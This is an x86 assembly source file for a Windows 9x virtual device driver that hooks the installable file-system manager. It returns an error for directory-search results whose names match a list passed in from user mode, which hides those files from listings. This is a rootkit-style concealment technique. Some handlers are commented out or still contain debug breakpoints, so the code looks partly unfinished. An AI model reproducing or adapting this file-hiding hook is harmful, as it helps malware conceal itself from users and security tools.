.586p
include vmm.inc
include vwin32.inc
include Ifsmgr.inc

DECLARE_VIRTUAL_DEVICE RXFile,1,0, RXFile_Control,UNDEFINED_DEVICE_ID, UNDEFINED_INIT_ORDER

Begin_control_dispatch RXFile
	Control_Dispatch w32_DeviceIoControl, RXFileDeviceControl
End_control_dispatch RXFile

VxD_PAGEABLE_DATA_SEG
        OPEN_FILE    EQU 24h
        BCS_OEM      EQU 1
        ; ActiveNext        dd 0
        OldStrucHook      dd 0
        ActiveFirstHandle dd 0
        BlockSize         dd 0
        ; BaseProcObj       dd 0
        szHiding     db "Hiding File..",0
        szShowing    db "Example File..",0
        szTmpString  db 256  dup(0)
        ; szFullString db 256  dup(0)
        szWinFindDat db 320  dup(0)
        szSearchName db 256  dup(0)
        szFileBlock  db 1024 dup(0)
        ; szNullBlock  db 1024 dup(0)
        szFileTbl    dd 10   dup(0)
        _ecx         dd 0

VxD_PAGEABLE_DATA_ENDS

VxD_PAGEABLE_CODE_SEG
BeginProc RXFileDeviceControl
        ; int 3

	RXIncomingCheck:
	cmp dword ptr [esi+0Ch], 0 ; DIOC_Open
	jz RxReturnControl
	cmp dword ptr [esi+0Ch], 1 ; DIOC_FileHide
	jz RxFileFill
	cmp dword ptr [esi+0Ch], 5 ; DIOC_BeginHooking
	jz RXBeginCode

        RxReturnControl:
	xor eax, eax
	ret

EndProc RXFileDeviceControl

        RxFileFill:
        ; int 3

        mov esi, [esi+10h]
        mov edi, offset szFileBlock
        mov ecx, 1024
        rep movsb

        xor edx, edx
        mov esi, offset szFileBlock
        mov edi, offset szFileTbl

        @@o:
        mov ebx, esi

        @@oo:
        lodsb
        cmp byte ptr [esi], 00Ah
        je @@ox
        test al, al
        jz @@of
        jmp @@oo

        @@of:
        mov eax, ebx
        stosd
        jmp @@o

        @@ox:
        mov eax, ebx
        stosd

        xor eax, eax
        ret

        RXBeginCode:
        ; int 3

        call BeginFileHooking
        xor eax, eax
        ret

	BeginFileHooking:
	; int 3

        pushad

	push offset FileHookingProc
	VxDCall IFSMgr_InstallFileSystemApiHook
	add esp, 4
	mov dword ptr [OldStrucHook], eax

	popad
	ret
	FinishFileHooking:

	FileHookingProc:
	; int 3
	push ebp
	mov ebp, esp
	sub esp, 20h

	call RxDealPacketType

        EndMad:
	leave
	ret

        RxDealPacketType proc
          pushad

          mov eax, [ebp+0Ch]
          ;cmp eax, 02CH ; IFSFN_FINDOPEN
          ;jne @@2
          ;popad
          ;call RxFindOpen
          ;jmp @@5

          @@2:
          ;cmp eax, 024H ; IFSFN_OPEN
          ;jne @@3
          ;popad
          ;call RxFileOpen
          ;jmp @@5

          @@3:
          cmp eax, 002h ; IFSFN_FINDNEXT
          jne @@4
          popad
          ; int 3
          call RxFindNext
          jmp @@5

          @@4:
          popad
          call RxInitialHandler

          @@5:
          ret
        RxDealPacketType endp
        
        RxFindOpen proc
          int 3
          mov ebx, [ebp+10h]
          and ebx, 0FFh
          cmp ebx, 0FFh
          je @@OpenCallHandler

          mov eax, [ebp+1ch]
          mov eax, [eax+24h]
          mov dword ptr [ActiveFirstHandle], eax

          pushad
	  xor eax, eax
	  push eax
	  mov eax, 100h
	  push eax
	  mov eax, [ebp+1ch]
	  mov eax, [eax+0ch]
	  add eax, 4
	  push eax
	  mov edi, offset szTmpString
	  push edi
	  VxDCall UniToBCSPath
	  add esp, 10h
	  popad

          int 3
          xor edx, edx
          mov ecx, 10

          @@RxOpLoopMast:
	  mov esi, offset szTmpString
          mov edi, [szFileTbl+edx]
          test edi, edi
          je @@OpenCallHandler
	  push ecx
          push edx
          push 1
	  call RxStrStr
	  pop edx
	  pop ecx

	  test eax, eax
          je @@bx

          add edx, 4
          loop @@RxOpLoopMast

          @@OpenCallHandler:
          call RxInitialHandler
          ;jmp @@x

          @@bx:
          ;mov esi, offset szHiding
	  ;VxDCall Out_Debug_String
          ;int 3
          ;xor eax, eax

          @@x:
          ret
        RxFindOpen endp

        RxFindNext proc
          mov ebx, [ebp+10h]
          and ebx, 0FFh
          cmp ebx, 0FFh
          je @@OpenCallHandler

          mov edi, offset szTmpString
          mov ecx, 100h
          xor eax, eax
          rep stosb

          push dword ptr [ebp+1Ch]
          push dword ptr [ebp+18h]
          push dword ptr [ebp+14h]
          push dword ptr [ebp+10h]
          push dword ptr [ebp+0Ch]
          push dword ptr [ebp+08h]
	  mov eax, dword ptr [OldStrucHook]
	  call dword ptr [eax]
	  add esp, (6*4)
	  
	  ; int 3

          mov eax, [ebp+1ch]
	  mov eax, [eax+14h]
	  add eax, 2Ch
          mov esi, eax

          pushad
	  xor eax, eax
	  push eax
	  mov eax, 100h
	  push eax
	  mov eax, esi
	  push eax
	  mov edi, offset szTmpString
	  push edi
	  VxDCall UniToBCSPath
	  add esp, 10h
	  popad
	  
	  pushad
	  mov esi, offset szTmpString
	  VxDCall Out_Debug_String
	  popad

          mov edi, offset szSearchName
          mov esi, offset szTmpString
          mov eax, [ebp+10h]
          add al, 40h ; '@'
          stosb
          mov al, 3Ah ; ':'
          stosb
          mov ecx, 253
          cld
          rep movsb
          
          ; int 3

	  xor edx, edx
          mov ecx, 10

          @@RxFNLoopMast:
	  mov esi, offset szTmpString
          mov edi, [szFileTbl+edx]
          test edi, edi
          je @@NextCallHandler
	  push ecx
          push edx
          push 3
	  call RxStrStr
	  pop edx
	  pop ecx

	  test eax, eax
          je @@SkipCallHandler

          add edx, 4
          loop @@RxFNLoopMast

          @@NextCallHandler:
          call RxInitialHandler
          jmp @@zk

          @@SkipCallHandler:
          xor eax, eax
          dec eax

          @@zk:
          ret
        RxFindNext endp

        RxFileOpen proc
          ; int 3
          mov ebx, [ebp+10h]
          and ebx, 0FFh
          cmp ebx, 0FFh
          je @@b

          mov eax, [ebp+1ch]
          mov eax, [eax+24h]
          mov dword ptr [ActiveFirstHandle], eax

          pushad
	  xor eax, eax
	  push eax
	  mov eax, 100h
	  push eax
	  mov eax, [ebp+1ch]
	  mov eax, [eax+0ch]
	  add eax, 4
	  push eax
	  mov edi, offset szTmpString
	  push edi
	  VxDCall UniToBCSPath
	  add esp, 10h
	  popad

          ; int 3

          ;xor edx, edx
          ;mov ecx, 10

          ;@@RxFOLoopMast:
	  ;mov esi, offset szTmpString
          ;mov edi, [szFileTbl+edx]
          ;test edi, edi
          ;je @@XOpenCallHandler
	  ;push ecx
          ;push edx
          ;push 3
	  ;call RxStrStr
	  ;pop edx
	  ;pop ecx

	  ;test eax, eax
          ;je @@XOpenCallHandler

          ;add edx, 4
          ;loop @@RxFOLoopMast

          ;@@XOpenCallHandler:
          call RxInitialHandler

          @@b:
          ret
        RxFileOpen endp
        
        RxInitialHandler proc
        
          push dword ptr [ebp+1Ch]
          push dword ptr [ebp+18h]
          push dword ptr [ebp+14h]
          push dword ptr [ebp+10h]
          push dword ptr [ebp+0Ch]
          push dword ptr [ebp+08h]
	  mov eax, dword ptr [OldStrucHook]
	  call dword ptr [eax]
          add esp, (6*4)
          
          ret
        RxInitialHandler endp

        RxStrStr proc
          pushad
          mov esi, edi
          mov ecx, 256
          xor eax, eax

          @@sub1:
          lodsb
          test eax, eax
          jz @@sub2
          loop @@sub1
          jmp @@sub6

          @@sub2:
          mov eax, 256
          sub eax, ecx
          mov dword ptr [BlockSize], eax

          popad

          mov ecx, 256
          xor edx, edx
          mov ebx, esi

          @@sub3:
          push edi
          add edi, [esp+8]
          mov esi, ebx
          add esi, edx
          cmp byte ptr [esi], 0
          je @@sub8
          add esi, 3
          push ecx
          mov ecx, dword ptr [BlockSize]
          sub ecx, 3
          repz cmpsb
          jz @@sub4
          pop ecx
          pop edi
          inc edx
          loop @@sub3
          xor eax, eax
          inc ecx
          jmp @@sub7

          @@sub6:
          popad
          xor eax, eax
          inc ecx
          jmp @@sub7

          @@sub4:
          add esp, 8

          @@sub5:
          xor eax, eax
          jmp @@sub7
          
          @@sub8:
          pop eax
          xor eax, eax
          inc eax

          @@sub7:
          retn 4
        RxStrStr endp

        RxStrLen proc
          pushad
          
          xor ecx, ecx
          
          RxCalcLen:
          lodsb
          test al, al
          jz RxCalcFin
          inc ecx
          jmp RxCalcLen

          RxCalcFin:
          mov dword ptr [_ecx], ecx

          popad
          mov ecx, dword ptr [_ecx]
          ret
        RxStrLen endp

VxD_PAGEABLE_CODE_ENDS

end
